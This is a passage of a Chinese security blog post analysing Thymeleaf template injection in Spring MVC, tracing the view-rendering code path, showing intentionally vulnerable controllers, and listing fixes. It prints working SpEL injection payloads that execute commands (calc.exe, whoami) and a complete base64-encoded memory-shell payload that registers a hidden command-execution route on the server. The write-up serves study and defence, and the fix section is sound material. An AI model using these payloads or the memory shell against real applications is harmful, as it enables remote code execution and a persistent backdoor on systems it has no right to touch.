Assert.state(<span class="hljs-built_in">this</span>.returnValueHandlers != <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;No return value handlers&quot;</span>);<br>		<span class="hljs-keyword">try</span> &#123;<br>			<span class="hljs-built_in">this</span>.returnValueHandlers.handleReturnValue(<br>					returnValue, getReturnValueType(returnValue), mavContainer, webRequest);<br>		&#125;<br>		<span class="hljs-keyword">catch</span> (Exception ex) &#123;<br>			<span class="hljs-keyword">if</span> (logger.isTraceEnabled()) &#123;<br>				logger.trace(formatErrorForReturnValue(returnValue), ex);<br>			&#125;<br>			<span class="hljs-keyword">throw</span> ex;<br>		&#125;<br>	&#125;<br></code></pre></td></tr></table></figure>
+
+<p>相关的变量值</p>
+<p><img src="https://cdn.clown2024.cn/image-20241213214443799.png" alt="image-20241213214443799"></p>
+<p>该函数内部进行了如下操作：</p>
+<ul>
+<li><code>invokeForRequest</code>调用Controller后获取返回值到<code>returnValue</code>中</li>
+<li>判断<code>returnValue</code>是否为空，如果是则继续判断<code>RequestHandled</code>是否为<code>True</code>，都满足的话设置<code>requestHandled</code>为<code>true</code></li>
+<li>通过<code>handleReturnValue</code>根据返回值的类型和返回值将不同的属性设置到<code>ModelAndViewContainer</code>中。</li>
+</ul>
+<p>这里往下走returnValue返回的是index</p>
+<p><img src="https://cdn.clown2024.cn/image-20241213214722184.png" alt="image-20241213214722184"></p>
+<p>然后再看handleReturnValue方法，这个方法应该就是对模板进行解析，继续跟进去看看</p>
+<p><img src="https://cdn.clown2024.cn/image-20241213221758950.png" alt="image-20241213221758950"></p>
+<p>获取一个ViewNameMethodReturnValueHandler然后继续处理，继续跟进</p>
+<p><img src="https://cdn.clown2024.cn/image-20241213222152893.png" alt="image-20241213222152893"></p>
+<ul>
+<li>判断returnValue类型是否为字符型，设置<code>mavContainer.viewName</code></li>
+<li>判断returnValue是否以<code>redirect:</code>开头，如果是的话则设置重定向的属性</li>
+</ul>
+<p>然后返回到RequestMappingHandlerAdapter#invokeHandlerMethod方法里面</p>
+<p><img src="https://cdn.clown2024.cn/image-20241213222951397.png" alt="image-20241213222951397"></p>
+<p>通过getModelAndView方法返回ModelAndView</p>
+<h2 id="获取modelandview视图"><a href="#获取ModelAndView视图" class="headerlink" title="获取ModelAndView视图"></a>获取ModelAndView视图</h2><p>获取<code>ModelAndView</code>后，通过<code>DispatcherServlet#render</code>获取视图解析器并渲染，中间的过程就不再分析了，就是枯燥的跟着走而已</p>
+<p>不过到这里流程也很符合前面流程图所总结的那样</p>
+<p><img src="https://cdn.clown2024.cn/image-20241213223643677.png" alt="image-20241213223643677"></p>
+<p>resolveViewName是遍历视图解析器然后返回一个，其中里面有五个视图解析器</p>
+<p><img src="https://cdn.clown2024.cn/image-20241213224250552.png" alt="image-20241213224250552"></p>
+<p>这里返回的View是ThymeleafView</p>
+<p><img src="https://cdn.clown2024.cn/image-20241213224019290.png" alt="image-20241213224019290"></p>
+<h2 id="视图渲染"><a href="#视图渲染" class="headerlink" title="视图渲染"></a>视图渲染</h2><p>最后就是调用ThymeleafView的render函数进行视图渲染</p>
+<p><img src="https://cdn.clown2024.cn/image-20241213224451300.png" alt="image-20241213224451300"></p>
+<p>后面的具体渲染分析漏洞的时候再调试</p>
+<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><h2 id="templatename漏洞"><a href="#templatename漏洞" class="headerlink" title="templatename漏洞"></a>templatename漏洞</h2><p>给出一个漏洞代码的demo</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.springbootmemoryshell.contorller.thymeleaf;<br><br><br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestParam;<br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VulnController</span> &#123;<br>    <span class="hljs-meta">@GetMapping(&quot;/path&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">path</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String lang)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;user/&quot;</span> + lang + <span class="hljs-string">&quot;/welcome&quot;</span>; <span class="hljs-comment">//template path is tainted</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这种情况是直接将参数拼接到了模板路径中</p>
+<p><strong>poc</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22calc.exe%22).getInputStream()).next()%7d__::.x<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这里即使不加<code>.x</code>依然可以触发命令执行</p>
+</blockquote>
+<p>一开始我用的thymeleaf2.5.10版本打这个payload给我报了下面的错误</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">View name contains an expression and so does either the URL path or one of the request parameters. This is forbidden in order to reduce the possibilities that direct user input is executed as a part of the view name.<br></code></pre></td></tr></table></figure>
+
+<p>这个错误信息表明在处理 Thymeleaf 模板时，视图名称包含了一个表达式，并且 URL 路径或请求参数中也包含了一个表达式。这种情况下，Thymeleaf 为了防止用户输入直接被执行为视图名称的一部分，禁止了这种情况。</p>
+<p>那说明后面版本的修复是采用了禁止表达式的方式，然后看了一下具体的报错版本</p>
+<p><img src="https://cdn.clown2024.cn/image-20241213230550190.png" alt="image-20241213230550190"></p>
+<p>是thymeleaf-spring5-3.0.15.RELEASE.jar这个版本的jar包修复了，需要将spring-boot-starter-parent的版本降一下，降成2.4.1就行了，然后这时候thymeleaf-spring的版本是3.0.11的版本</p>
+<p><img src="https://cdn.clown2024.cn/image-20241213230754543.png" alt="image-20241213230754543"></p>
+<h3 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h3><p>关键在前面我们没分析的renderFragment函数的渲染过程里面</p>
+<p><img src="https://cdn.clown2024.cn/image-20241213231629083.png" alt="image-20241213231629083"></p>
+<p>首先如上图，我们得viewTemplateName经过拼接之后的值现在是</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">user/__$&#123;new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;calc.exe&quot;).getInputStream()).next()&#125;__::/welcome<br></code></pre></td></tr></table></figure>
+
+<p>然后他会判断里面是否有::字符串，这代表其是一个片段表达式</p>
+<p>然后继续往下</p>
+<p><img src="https://cdn.clown2024.cn/image-20241213231941833.png" alt="image-20241213231941833"></p>
+<p>会获取一个表达式解析器，然后解析表达式，且将我们的viewTemplateName用~{和}包裹起来</p>
+<p>然后触发的过程就在parseExpression方法里面，一直往后走会走到StandardExpressionPreprocessor#preprocess方法内</p>
+<p><img src="https://cdn.clown2024.cn/image-20241213233227916.png" alt="image-20241213233227916"></p>
+<p>这里有一个正则提取内容的匹配器</p>
+<p><img src="https://cdn.clown2024.cn/image-20241213233851249.png" alt="image-20241213233851249"></p>
+<p>其正则匹配格式如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">\_\_(.*?)\_\_<br></code></pre></td></tr></table></figure>
+
+<p>代表其匹配__…__之间的内容，也就是可以将我们里面的表达式内容分割出来了，继续往下看</p>
+<p><img src="https://cdn.clown2024.cn/image-20241213234249011.png" alt="image-20241213234249011"></p>
+<p>最终是将我们的表达式分割出来，获得了一个VariableExpression，然后执行其execute函数执行表达式</p>
+<p>然后层层调用最终通过SPEL来执行表达式内容</p>
+<p><img src="https://cdn.clown2024.cn/image-20241213234528330.png" alt="image-20241213234528330"></p>
+<p>所以该漏洞实际上就是SPEL表达式执行</p>
+<p>所以根据前面的分析我们可以知道可以不需要.x，但是下面的漏洞形式一定需要.x</p>
+<h2 id="uri-path"><a href="#URI-PATH" class="headerlink" title="URI PATH"></a>URI PATH</h2><p>漏洞代码</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/doc/&#123;document&#125;&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">getDocument</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> String document)</span> &#123;<br>    log.info(<span class="hljs-string">&quot;Retrieving &quot;</span> + document);<br>    <span class="hljs-comment">//returns void, so view name is taken from URI</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这里漏洞原理总结起来就是因为ModelAndView返回值为空，所以viewTemplateName会从uri中获取，直接在<code>&#123;document&#125;</code>位置传入payload即可</p>
+<p>poc</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">http://localhost:8081/doc/lang=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22calc.exe%22).getInputStream()).next()%7d__::.x<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.clown2024.cn/image-20241213235751753.png" alt="image-20241213235751753"></p>
+<h3 id="流程分析"><a href="#流程分析-1" class="headerlink" title="流程分析"></a>流程分析</h3><p>来具体看一下为什么没有返回也会赋值的原因，原因主要在<code>DispatcherServlet#doDispatch</code>中，获取<code>ModleAndView</code>后还会执行<code>applyDefaultViewName</code>方法。</p>
+<p><img src="https://cdn.clown2024.cn/image-20241214000125870.png" alt="image-20241214000125870"></p>
+<p>可以看到此时的mv里面都为空，然后会执行一个applyDefaultViewName方法</p>
+<p><img src="https://cdn.clown2024.cn/image-20241214000313196.png" alt="image-20241214000313196"></p>
+<p>里面会从request对象里面获取一个默认的ViewName，获取到的defaultViewName就是我们的路径</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">doc/lang=__$&#123;new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;calc.exe&quot;).getInputStream()).next()&#125;__::<br></code></pre></td></tr></table></figure>
+
+<p>然后就把viewname设置为了我们默认的这个ViewName</p>
+<p>欸然后这里发现，get回来的ViewName已经把我们的.x去掉了，这是怎么回事呢，进去具体看看都发生了什么</p>
+<p>具体是里面的一个transformPath函数，对路由进行了格式转化</p>
+<p><img src="https://cdn.clown2024.cn/image-20241214001608987.png" alt="image-20241214001608987"></p>
+<p>首先前面两部分是去掉了前后的&#x2F;，然后调用StringUtils.stripFilenameExtension方法</p>
+<p><img src="https://cdn.clown2024.cn/image-20241214001912868.png" alt="image-20241214001912868"></p>
+<p>里面分别获取了最后一个.的索引和最后一个&#x2F;的索引，然后截取到最后一个.索引的内容</p>
+<p>到这里就明白我们最后为什么要加一个.x了吧，因为需要保证我们前面的payload是完整的，所以得在最后加一个.，其实经过分析在最后加个.就可以了，不用.x</p>
+<p>后面的流程就和前面一样了，就不分析了</p>
+<blockquote>
+<p>注意这个只适合无返回值的时候，不然view就会被返回值给占了</p>
+</blockquote>
+<h2 id="回显问题"><a href="#回显问题" class="headerlink" title="回显问题"></a>回显问题</h2><p>看文章他们的回显内容显示在了前端的报错信息内部，像这样</p>
+<p><img src="https://cdn.clown2024.cn/image-20241214003633723.png" alt="image-20241214003633723"></p>
+<p>而我的没有，他在后台的控制台的报错内容倒是有没绷住</p>
+<p><img src="https://cdn.clown2024.cn/image-20241214003725080.png" alt="image-20241214003725080"></p>
+<p>然后有回显的poc需要::后面是有内容的，大致原因主要是在<code>StandardExpressionParser#parseExpression</code>,在<code>preprocess</code>预处理结束后还会通过<code>Expression.parse</code>进行一次解析，这里如果解析失败则不会回显，这里就不分析了</p>
+<p>poc在::后面随便加点内容就可以了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">http://localhost:8081/doc/=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22whoami%22).getInputStream()).next()%7d__::aa.<br></code></pre></td></tr></table></figure>
+
+<p>至于我前段为什么没回显我就不想纠结了，不如直接打内存马来的方便，有关spel表达式注入的学习放下一篇文章了。</p>
+<h2 id="注入内存马"><a href="#注入内存马" class="headerlink" title="注入内存马"></a>注入内存马</h2><p>这里直接copy文章的一个内存马payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">http://localhost:8081/doc/__$&#123;T (org.springframework.cglib.core.ReflectUtils).defineClass(&quot;SpringRequestMappingMemshell&quot;,T (org.springframework.util.Base64Utils).decodeFromUrlSafeString(&quot;yv66vgAAADQAoQoACQBRCABSCgBTAFQIAFUKAFMAVgoACQBXCAAzBwBYBwBZBwBaCgAIAFsKAAoAXAcAXQgANQcAXgoACABfBwBgCABhCgARAGIHAGMHAGQKABQAZQcAZgoAFwBnCgANAFEKAAoAaAgAaQcAagoAHABrCABsCQBtAG4KAG8AcAcAcQoAcgBzCgAhAHQIAHUKACEAdgoAIQB3BwB4CQB5AHoKACcAewEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAeTFNwcmluZ1JlcXVlc3RNYXBwaW5nTWVtc2hlbGw7AQAIZG9JbmplY3QBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvU3RyaW5nOwEAD3JlZ2lzdGVyTWFwcGluZwEAGkxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAOZXhlY3V0ZUNvbW1hbmQBABhwYXR0ZXJuc1JlcXVlc3RDb25kaXRpb24BAEhMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL1BhdHRlcm5zUmVxdWVzdENvbmRpdGlvbjsBABdtZXRob2RzUmVxdWVzdENvbmRpdGlvbgEATkxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUmVxdWVzdE1ldGhvZHNSZXF1ZXN0Q29uZGl0aW9uOwEAEnJlcXVlc3RNYXBwaW5nSW5mbwEAP0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvOwEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBABxyZXF1ZXN0TWFwcGluZ0hhbmRsZXJNYXBwaW5nAQASTGphdmEvbGFuZy9PYmplY3Q7AQADbXNnAQASTGphdmEvbGFuZy9TdHJpbmc7AQANU3RhY2tNYXBUYWJsZQcAWQcAXgcAagEAEE1ldGhvZFBhcmFtZXRlcnMBAD0oTGphdmEvbGFuZy9TdHJpbmc7KUxvcmcvc3ByaW5nZnJhbWV3b3JrL2h0dHAvUmVzcG9uc2VFbnRpdHk7AQADY21kAQAKZXhlY1Jlc3VsdAEACkV4Y2VwdGlvbnMHAHwBACJSdW50aW1lVmlzaWJsZVBhcmFtZXRlckFubm90YXRpb25zAQA2TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2JpbmQvYW5ub3RhdGlvbi9SZXF1ZXN0UGFyYW07AQAFdmFsdWUBAApTb3VyY2VGaWxlAQAhU3ByaW5nUmVxdWVzdE1hcHBpbmdNZW1zaGVsbC5qYXZhDAAqACsBAAxpbmplY3Qtc3RhcnQHAH0MAH4AfwEACGNhbGMuZXhlDACAAIEMAIIAgwEAD2phdmEvbGFuZy9DbGFzcwEAEGphdmEvbGFuZy9PYmplY3QBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QMAIQAhQwAhgCHAQAcU3ByaW5nUmVxdWVzdE1hcHBpbmdNZW1zaGVsbAEAEGphdmEvbGFuZy9TdHJpbmcMAIgAhQEARm9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9QYXR0ZXJuc1JlcXVlc3RDb25kaXRpb24BAAIvKgwAKgCJAQBMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL1JlcXVlc3RNZXRob2RzUmVxdWVzdENvbmRpdGlvbgEANW9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2JpbmQvYW5ub3RhdGlvbi9SZXF1ZXN0TWV0aG9kDAAqAIoBAD1vcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvDAAqAIsMAIwAjQEADmluamVjdC1zdWNjZXNzAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwAjgArAQAMaW5qZWN0LWVycm9yBwCPDACQAJEHAJIMAJMAlAEAEWphdmEvdXRpbC9TY2FubmVyBwCVDACWAJcMACoAmAEAAlxBDACZAJoMAJsAnAEAJ29yZy9zcHJpbmdmcmFtZXdvcmsvaHR0cC9SZXNwb25zZUVudGl0eQcAnQwAngCfDAAqAKABABNqYXZhL2lvL0lPRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEACWdldE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAEWdldERlY2xhcmVkTWV0aG9kAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEAOyhbTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2JpbmQvYW5ub3RhdGlvbi9SZXF1ZXN0TWV0aG9kOylWAQH2KExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUGF0dGVybnNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUmVxdWVzdE1ldGhvZHNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUGFyYW1zUmVxdWVzdENvbmRpdGlvbjtMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL0hlYWRlcnNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vQ29uc3VtZXNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUHJvZHVjZXNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUmVxdWVzdENvbmRpdGlvbjspVgEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAD3ByaW50U3RhY2tUcmFjZQEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAFcHJpbnQBABUoTGphdmEvbGFuZy9PYmplY3Q7KVYBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAARuZXh0AQAUKClMamF2YS9sYW5nL1N0cmluZzsBACNvcmcvc3ByaW5nZnJhbWV3b3JrL2h0dHAvSHR0cFN0YXR1cwEAAk9LAQAlTG9yZy9zcHJpbmdmcmFtZXdvcmsvaHR0cC9IdHRwU3RhdHVzOwEAOihMamF2YS9sYW5nL09iamVjdDtMb3JnL3NwcmluZ2ZyYW1ld29yay9odHRwL0h0dHBTdGF0dXM7KVYAIQANAAkAAAAAAAMAAQAqACsAAQAsAAAALwABAAEAAAAFKrcAAbEAAAACAC0AAAAGAAEAAAAMAC4AAAAMAAEAAAAFAC8AMAAAAAkAMQAyAAIALAAAAXEACQAHAAAApBICTLgAAxIEtgAFVyq2AAYSBwa9AAhZAxIJU1kEEglTWQUSClO2AAtNLAS2AAwSDRIOBL0ACFkDEg9TtgAQTrsAEVkEvQAPWQMSElO3ABM6BLsAFFkDvQAVtwAWOgW7ABdZGQQZBQEBAQEBtwAYOgYsKga9AAlZAxkGU1kEuwANWbcAGVNZBS1TtgAaVxIbTKcAEk0stgAdEh5MsgAfLLYAICuwAAEAAwCQAJMAHAADAC0AAABCABAAAAAOAAMAEAAMABEAKQASAC4AEwA_ABQAUQAVAF4AFgBwABcAjQAYAJAAHQCTABkAlAAaAJgAGwCbABwAogAeAC4AAABSAAgAKQBnADMANAACAD8AUQA1ADQAAwBRAD8ANgA3AAQAXgAyADgAOQAFAHAAIAA6ADsABgCUAA4APAA9AAIAAACkAD4APwAAAAMAoQBAAEEAAQBCAAAAEwAC_wCTAAIHAEMHAEQAAQcARQ4ARgAAAAUBAD4AAAABADUARwAEACwAAABoAAQAAwAAACa7ACFZuAADK7YABbYAIrcAIxIktgAltgAmTbsAJ1kssgAotwApsAAAAAIALQAAAAoAAgAAACMAGgAkAC4AAAAgAAMAAAAmAC8AMAAAAAAAJgBIAEEAAQAaAAwASQBBAAIASgAAAAQAAQBLAEYAAAAFAQBIAAAATAAAAAwBAAEATQABAE5zAEgAAQBPAAAAAgBQ&quot;),nEw javax.management.loading.MLet(NeW java.net.URL(&quot;http&quot;,&quot;127.0.0.1&quot;,&quot;1.txt&quot;),T (java.lang.Thread).currentThread().getContextClassLoader())).doInject(T (org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;,0).getBean(T (Class).forName(&quot;org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping&quot;)))&#125;__::main.x<br></code></pre></td></tr></table></figure>
+
+<p>然后访问 <code>/asd?cmd=whoami</code> 。</p>
+<h2 id="其他姿势"><a href="#其他姿势" class="headerlink" title="其他姿势"></a>其他姿势</h2><p>${…}改成*{…}也是可以的</p>
+<p><strong>省略__</strong></p>
+<p>当Controller如下配置时，可以省略<code>__</code>包裹，因为我们不需要特意去分割字符串了</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/path&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">path2</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String lang)</span> &#123;<br>    <span class="hljs-keyword">return</span> lang; <span class="hljs-comment">//template path is tainted</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h1 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h1><ol>
+<li><p>配置 <code>@ResponseBody</code> 或者 <code>@RestController</code>，这两个注解一开始也提到过，他们会将返回值会自动作为HTTP响应的正文返回，这意味着返回值不会被视图解析器处理，而是直接写入HTTP响应体中。</p>
+</li>
+<li><p>在返回值前面加上 “redirect:”</p>
+<p>这样不再由 Spring ThymeleafView来进行解析，而是由 RedirectView 来进行解析。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/safe/redirect&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">redirect</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String url)</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;redirect:&quot;</span> + url; <span class="hljs-comment">//FP as redirects are not resolved as expressions</span><br>&#125;<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>在方法参数中加上 HttpServletResponse 参数</p>
+<p>由于controller的参数被设置为HttpServletResponse，Spring认为它已经处理了HTTP Response，因此不会发生视图名称解析。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/safe/doc/&#123;document&#125;&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">getDocument</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> String document, HttpServletResponse response)</span> &#123;<br>    log.info(<span class="hljs-string">&quot;Retrieving &quot;</span> + document);<br>&#125;<br></code></pre></td></tr></table></figure></li>
+</ol>
+<p>不过这些修复都比较临时，还是升级到新版本比较好</p>
+<p>就先看这么多吧，新版本还有点东西有点懒了不想写了，之后遇到再学，毕竟实战感觉这种ssti并不会很多🥲</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10514?time__1311=CqjxRD0iiteiqGNeeeuDQwqxfOj6eHDBWoD">https://xz.aliyun.com/t/10514?time__1311=CqjxRD0iiteiqGNeeeuDQwqxfOj6eHDBWoD</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/254519">https://www.anquanke.com/post/id/254519</a></p>
+<p><a target="_blank" rel="noopener" href="https://justdoittt.top/2024/03/24/Thymeleaf%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/index.html">https://justdoittt.top/2024/03/24/Thymeleaf%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/index.html</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://clowsman.github.io">clown</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://clowsman.github.io/2024/12/13/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/">https://clowsman.github.io/2024/12/13/thymeleaf模板注入/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://clowsman.github.io" target="_blank">clown</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/java/">java</a><a class="post-meta__tags" href="/tags/ssti/">ssti</a></div><div class="post_share"><div class="social-share" data-image="http://cdn.clown2024.cn/202407151814125.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/12/01/Tabby%E4%BD%BF%E7%94%A8%E5%AD%A6%E4%B9%A0/" title="Tabby使用学习"><img class="cover" src="http://cdn.clown2024.cn/202407151814114.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Tabby使用学习</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/06/10/ASM%E5%AD%A6%E4%B9%A0/" title="ASM学习"><img class="cover" src="http://cdn.clown2024.cn/202407151814115.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-06-10</div><div class="title">ASM学习</div></div></a></div><div><a href="/2024/11/01/C3P0%E5%88%A9%E7%94%A8%E9%93%BE%E5%AD%A6%E4%B9%A0/" title="C3P0利用链学习"><img class="cover" src="http://cdn.clown2024.cn/202407151814123.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-01</div><div class="title">C3P0利用链学习</div></div></a></div><div><a href="/2024/10/08/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="Hessian反序列化"><img class="cover" src="http://cdn.clown2024.cn/202407151814129.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-08</div><div class="title">Hessian反序列化</div></div></a></div><div><a href="/2024/10/29/JDK17%E5%8F%8D%E5%B0%84%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/" title="JDK17反射限制绕过学习"><img class="cover" src="http://cdn.clown2024.cn/202407151814130.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-29</div><div class="title">JDK17反射限制绕过学习</div></div></a></div><div><a href="/2024/11/18/DASCtf-easyjob/" title="DASCtf-easyjob"><img class="cover" src="http://cdn.clown2024.cn/202407151814125.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-18</div><div class="title">DASCtf-easyjob</div></div></a></div><div><a 